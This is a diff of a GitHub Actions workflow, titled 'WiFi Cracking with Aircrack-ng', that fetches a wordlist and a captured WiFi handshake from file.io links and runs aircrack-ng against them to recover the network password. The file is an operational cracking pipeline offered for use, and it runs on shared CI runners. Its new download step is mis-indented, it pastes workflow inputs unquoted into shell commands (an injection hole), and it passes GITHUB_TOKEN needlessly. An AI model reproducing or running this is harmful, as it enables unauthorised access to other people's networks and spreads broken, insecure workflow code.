@@ -3,11 +3,11 @@ name: WiFi Cracking with Aircrack-ng
 on:
   workflow_dispatch:
     inputs:
-      dictionary_url:
-        description: 'URL to the dictionary text file'
+      fileio_link_dictionary:
+        description: 'Shareable link to the dictionary text file from file.io'
         required: true
-      pcap_file_url:
-        description: 'URL to the pcap/cap file'
+      fileio_link_pcap:
+        description: 'Shareable link to the pcap/cap file from file.io'
         required: true
 
 jobs:
@@ -16,34 +16,30 @@ jobs:
     steps:
       - name: Download Dictionary File
         run: |
-          curl -sSL -o dictionary.txt ${{ github.event.inputs.dictionary_url }}
-          echo "Downloaded dictionary.txt:"
-          ls -l dictionary.txt
-          
+            sudo apt install -y jq
+          fileio_link="${{ github.event.inputs.fileio_link_dictionary }}"
+          download_url=$(curl -s $fileio_link | jq -r '.link')
+          curl -L -o dictionary.txt "$download_url"
+        shell: bash
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
       - name: Download PCAP File
         run: |
-          curl -sSL -o wifi_capture.pcap ${{ github.event.inputs.pcap_file_url }}
-          echo "Downloaded wifi_capture.pcap:"
-          ls -l wifi_capture.pcap
-          
+          fileio_link="${{ github.event.inputs.fileio_link_pcap }}"
+          download_url=$(curl -s $fileio_link | jq -r '.link')
+          curl -L -o wifi_capture.pcap "$download_url"
+        shell: bash
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      
       - name: Install Aircrack-ng
-        run: sudo apt update && sudo apt install -y aircrack-ng
-
-      - name: Verify PCAP File
         run: |
-          file wifi_capture.pcap
-          tcpdump -r wifi_capture.pcap -c 10
-          
-      - name: Use Aircrack-ng to Crack WiFi Password
+          sudo apt update
+          sudo apt install -y aircrack-ng
+        shell: bash
+
+      - name: Run Aircrack-ng
         run: |
           aircrack-ng -w dictionary.txt wifi_capture.pcap
-        working-directory: ${{ github.workspace }}
-      
-      - name: Display Results
-        run: |
-          if [ -f "KEY_FOUND.txt" ]; then
-            echo "WiFi password cracked:"
-            cat KEY_FOUND.txt
-          else
-            echo "WiFi password not cracked."
-          fi
+        shell: bash
